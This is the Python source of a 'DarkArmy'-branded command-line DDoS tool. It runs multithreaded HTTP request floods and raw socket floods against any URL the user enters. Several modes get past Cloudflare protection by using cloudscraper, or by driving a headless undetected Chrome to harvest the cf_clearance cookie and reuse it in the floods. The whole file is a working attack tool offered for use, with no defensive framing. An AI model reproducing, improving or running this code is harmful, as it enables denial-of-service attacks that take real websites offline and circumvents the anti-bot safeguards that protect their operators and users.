# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
init(convert=True)


def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while (until - datetime.datetime.now()).total_seconds() > 0:
        stdout.write("\r "+Fore.YELLOW+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + "sec left")
        stdout.flush()
    stdout.flush()
    stdout.write("\n"+Fore.YELLOW+" [*] "+Fore.WHITE+"Attack Done!\n")

#region RAW
def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    while threads_count <= int(th):
        try:
            thd = threading.Thread(target=AttackRAW, args=(url, until))
            thd.start()
            threads_count += 1
        except:
            pass

def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url)
            requests.get(url)
        except:
            pass
#endregion

#region SOC
def LaunchSOC(url, port, th, t):
    global request
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    req =    "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req +=   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    while threads_count <= int(th):
        try:
            thd = threading.Thread(target=AttackSOC, args=(url, port, until, req))
            thd.start()
            threads_count += 1
        except:
            pass

def AttackSOC(url, port, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((urlparse(url).netloc, int(port)))
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass
#endregion

#region CFB
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    scraper = cloudscraper.create_scraper()
    while threads_count <= int(th):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
            threads_count += 1
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion

#region UAM

headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
}

#def LaunchUAM(url, th, t):
#    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
#    threads_count = 0
#    session = requests.Session()
#    scraper = cloudscraper.create_scraper(sess=session)
#    f = open('./solver/cookie.txt', 'r')
#    line = f.readlines()
#    cle = line[2].replace(" ", "").replace("'", "").replace("\n", "").replace(";", "").replace("cf_clearance=", "")
#    jar = RequestsCookieJar()
#    cook = [{
#        'name': 'cf_clearance',
#        'value': cle
#    }]
#    for cookie in cook:
#        jar.set(cookie['name'], cookie['value'])
#        scraper.cookies = jar
#    while threads_count <= int(th):
#        try:
#            thd = threading.Thread(target=AttackUAM, args=(url, until, scraper))
#            thd.start()
#            threads_count += 1
#        except:
#            pass
#
#def AttackUAM(url, until_datetime, scraper):
#    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
#        try:
#            scraper.get(url=url, headers=headers, allow_redirects=False)
#            scraper.get(url=url, headers=headers, allow_redirects=False)
#        except:
#            pass
#endregion

#region CFPRO
def getcookie(url):
    global cookies
    options = webdriver.ChromeOptions()
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-setuid-sandbox')
    options.add_argument('--disable-infobars')
    options.add_argument('--disable-logging')
    options.add_argument('--disable-login-animations')
    options.add_argument('--disable-notifications')
    options.add_argument('--disable-gpu')
    options.add_argument('--headless')
    options.add_argument('--lang=ko_KR')
    options.add_argument("--start-maxmized")
    options.add_argument('--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en')
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    ii = 0
    while ii == 0:
        cookies = driver.get_cookies()
        for i in cookies:
            if i['name'] == "cf_clearance":
                driver.quit()
                ii += 1
            else:
                pass
        time.sleep(0.2)
    driver.quit()

def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    for cookie in cookies:
        jar.set(cookie['name'], cookie['value'])
        scraper.cookies = jar
    #stdout.write(jar)
    while threads_count <= int(th):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
            threads_count += 1
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass
#endregion

#region CFSOC

def LaunchCFSOC(url, th, t):
	options = webdriver.ChromeOptions()
	options.add_argument('--no-sandbox')
	options.add_argument('--disable-setuid-sandbox')
	options.add_argument('--disable-infobars')
	options.add_argument('--disable-logging')
	options.add_argument('--disable-login-animations')
	options.add_argument('--disable-notifications')
	options.add_argument('--disable-gpu')
	options.add_argument('--headless')
	options.add_argument('--lang=ko_KR')
	options.add_argument("--start-maxmized")
	options.add_argument('--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en')
	driver = webdriver.Chrome(options=options)
	driver.implicitly_wait(3)
	driver.get(url)
	ii = 0
	while ii == 0:
		cookies = driver.get_cookies()
		for i in cookies:
			if i['name'] == "cf_clearance":
				cookieJAR = driver.get_cookies()[0]
				useragent = driver.execute_script("return navigator.userAgent")
				cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
				driver.quit()
				ii += 1
			else:
				pass
		time.sleep(0.2)
	driver.quit()
	until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
	threads_count = 0

	target = {}
	target['uri'] = urlparse(url).path
	target['host'] = urlparse(url).netloc
	target['scheme'] = urlparse(url).scheme
	if ":" in urlparse(url).netloc:
		target['port'] = urlparse(url).netloc.split(":")[1]
	else:
		target['port'] = "443" if urlparse(url).scheme == "https" else "80"
		pass

	network = {}
	network['raw'] =  'GET / HTTP/1.1\r\n'
	network['raw'] += 'Host: ' + target['host'] + '\r\n'
	network['raw'] += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
	network['raw'] += 'Accept-Encoding: gzip, deflate, br\r\n'
	network['raw'] += 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
	network['raw'] += 'Cache-Control: max-age=0\r\n'
	network['raw'] += 'Cookie: ' + cookie + '\r\n'
	network['raw'] += f'sec-ch-ua: "Chromium";v="99", "Google Chrome";v="99"\r\n'
	network['raw'] += 'sec-ch-ua-mobile: ?0\r\n'
	network['raw'] += 'sec-ch-ua-platform: "Windows"\r\n'
	network['raw'] += 'sec-fetch-dest: empty\r\n'
	network['raw'] += 'sec-fetch-mode: cors\r\n'
	network['raw'] += 'sec-fetch-site: same-origin\r\n'
	network['raw'] += 'Connection: Keep-Alive\r\n'
	network['raw'] += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
	#stdout.write(network['raw'])
	while threads_count <= int(th):
		try:
			thd = threading.Thread(target=AttackCFSOC,args=(until, target, network,))
			thd.start()
			threads_count += 1
		except:  
			pass

def AttackCFSOC(until_datetime, target, network):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        sp = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                sp.send(str.encode(network['raw']))
                pass
        except:
            packet.close()
            pass

#endregion

def clear(): 
    if name == 'nt': 
        _ = system('cls') 
    else: 
        _ = system('clear') 

def title():
    stdout.write("                                                                                          \n")
    stdout.write("                          "+Fore.LIGHTYELLOW_EX+"╔╦╗╔═╗╦═╗╦╔═╔═╗╦═╗╔╦╗╦ ╦         \n")
    stdout.write("                          "+Fore.LIGHTRED_EX    +" ║║╠═╣╠╦╝╠╩╗╠═╣╠╦╝║║║╚╦╝          \n")
    stdout.write("                          "+Fore.RED            +"═╩╝╩ ╩╩╚═╩ ╩╩ ╩╩╚═╩ ╩ ╩          \n")
    stdout.write("                                                                                          \n")
    stdout.write("                                                                                          \n")
    stdout.write("                          "+Fore.LIGHTGREEN_EX+"    *darkarmy.live *   \n")
    stdout.write("                                                                                          \n")

def command():
    stdout.write(Fore.LIGHTYELLOW_EX+"╔══["+Fore.RED+"DarkArmy"+Fore.LIGHTGREEN_EX+"@"+Fore.RED+"User"+Fore.YELLOW+"]"+Fore.LIGHTYELLOW_EX+"\n╚"+Fore.LIGHTYELLOW_EX+"═══➤"+Fore.WHITE)
    command = input()
    if command == "cls":
        clear()
        title()
    elif command == "clear":
        clear()
        title()
    elif command == "?":
        funcc()
    elif command == "help":
        funcc()
    elif command == "exit":
        exit()
    elif command == "cfb":
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
        target = input()
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
        thread = input()
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
        t = input()
        time.sleep(1)
        co = threading.Thread(target=countdown, args=(t,))
        co.start()
        LaunchCFB(target, thread, t)
        time.sleep(int(t))
    elif command == "raw":
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
        target = input()
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
        thread = input()
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
        t = input()
        time.sleep(1)
        co = threading.Thread(target=countdown, args=(t,))
        co.start()
        LaunchRAW(target, thread, t)
        time.sleep(int(t))
    elif command == "soc":
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
        target = input()
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"PORT    : "+Fore.LIGHTGREEN_EX)
        port = input()
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
        thread = input()
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
        t = input()
        time.sleep(1)
        co = threading.Thread(target=countdown, args=(t,))
        co.start()
        LaunchSOC(target, port, thread, t)
        time.sleep(int(t))
    #elif command == "uam":
    #    stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
    #    target = input()
    #    stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
    #    thread = input()
    #    stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
    #    t = input()
    #    time.sleep(1)
    #    stdout.write(Fore.YELLOW+" [*] "+Fore.WHITE+"Bypassing UAM...")
    #    os.system('node ./solver/start.js > ./solver/cookie.txt')
    #    LaunchUAM(target, thread, t)
    #    co = threading.Thread(target=countdown, args=(t,))
    #    co.start()
    #    time.sleep(int(t))
    elif command == "cfpro":
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
        target = input()
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
        thread = input()
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
        t = input()
        time.sleep(1)
        stdout.write(Fore.YELLOW+" [*] "+Fore.WHITE+"Bypassing CF...\n")
        getcookie(target)
        co = threading.Thread(target=countdown, args=(t,))
        co.start()
        LaunchCFPRO(target, thread, t)
        time.sleep(int(t))
    elif command == "cfsoc":
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
        target = input()
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
        thread = input()
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
        t = input()
        time.sleep(1)
        stdout.write(Fore.YELLOW+" [*] "+Fore.WHITE+"Bypassing CF...\n")
        LaunchCFSOC(target, thread, t)
        co = threading.Thread(target=countdown, args=(t,))
        co.start()
        time.sleep(int(t))
    else:
        stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"Unknown command. 'help' or '?' to see all commands.\n")

def funcc():
	stdout.write(Fore.RED+" ["+Fore.WHITE+"LAYER 7"+Fore.RED+"]\n")
	stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass Normal CF\n")
	#stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"uam        "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM")
	stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
	stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
	stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
	stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
	stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
	stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
	stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
	stdout.write(Fore.RED+" \n["+Fore.WHITE+"ETC.."+Fore.RED+"]\n")
	stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
	stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")

def hello():
	global namee
	dir = "C:/1ucif3r/"
	if os.path.exists(dir):
		namee = open(dir+"User.txt").readline()
		pass
	else:
		if not os.path.exists(dir):
			os.makedirs(dir)
		stdout.write(Fore.YELLOW+">>> "+Fore.WHITE+"Input User name: " + Fore.LIGHTGREEN_EX, end='')
		put = input()
		f = open("C:/1ucif3r/User.txt", 'w').write(put)
		namee = open(dir+"User.txt").readline()
	stdout.write(Fore.YELLOW+" [>] "+Fore.WHITE+"Welcome Back, "+namee+"!\n")



if __name__ == '__main__':
	global namee
	namee = 'user'
	clear()
	title()
	#hello()
	while True:
		command()

